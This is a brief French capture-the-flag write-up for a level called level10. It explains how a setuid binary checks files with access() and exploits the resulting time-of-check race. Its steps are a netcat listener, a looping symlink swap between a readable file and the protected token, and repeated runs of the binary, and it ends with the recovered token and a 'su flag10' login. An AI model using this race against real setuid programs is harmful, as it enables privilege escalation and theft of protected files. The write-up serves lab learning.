'strings level10' nous indique que c'est un transfert de données sur le port 6969

%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..

'nm -u level10' et 'gdb level10' Nous indique qu'il y a une verification du fichier avec access

En faisant un 'man access' on nous dis très clairement qu'il y a une faille exploitable durant un cours laps de temps qui permet de by pass la verification de access.

On lance un 'nc -lk 6969 > /tmp/flag &'

ON lance un script shell

while true; do
    ln -fs ~/level10 /tmp/get; ln -fs ~/token /tmp/get;
done &

Ensuite on lance le binaire jusqu'a voir affiché 'woupa2yuojeeaaed06riuj63c'

qui nous permet de nous connecter avec su flag10